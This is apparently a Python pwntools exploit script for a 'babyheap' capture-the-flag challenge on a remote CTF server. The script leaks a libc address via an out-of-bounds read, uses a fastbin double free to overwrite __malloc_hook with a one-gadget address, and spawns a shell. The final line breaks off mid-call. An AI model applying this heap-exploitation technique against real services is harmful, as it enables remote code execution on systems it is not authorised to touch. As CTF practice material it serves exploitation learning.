from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3030)
#r = process("./babyheap")
e = ELF("./babyheap")
l = ELF("./libc.so.6")
#context.log_level = "debug"

ptr_add = 0x0000000000602060
read_add = 0x00000000004005F0
read_offset = l.sym['read']
malloc_hook_off = l.sym['__malloc_hook']
one_shot_off = 0xf02a4

def show(num) :
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("index: ")
    r.sendline(num)

def malloc(size, comment) :
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("size: ")
    r.sendline(str(size))
    r.recvuntil("content: ")
    r.sendline(comment)

def free(index) :
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("index: ")
    r.sendline(str(index))



show(str((read_add-ptr_add)/8))
leak = u64(r.recvuntil('\x7f')[-6:]+'\x00\x00')
libc_base = leak - read_offset
malloc_hook_add = libc_base + malloc_hook_off
one_shot_add = libc_base + one_shot_off

log.info("leak = " + hex(leak))
log.info("libc_base = " + hex(libc_base))
log.info("malloc_hook_add = " + hex(malloc_hook_add))
log.info("one_shot_add = " + hex(one_shot_add))

malloc(89,"A"*8)
malloc(89,"B"*8)

free(0)
free(1)
free(0) # A --> B --> A

malloc(89,p64(malloc_hook_add-35))
malloc(89,"C"*8)
malloc(89,"D"*8)
malloc(89,"E"*19+p64(one_shot_add)) #malloc_hook overwrite

free(2)
free(2) # crack --> call malloc_hook --> get shell

r.interactive(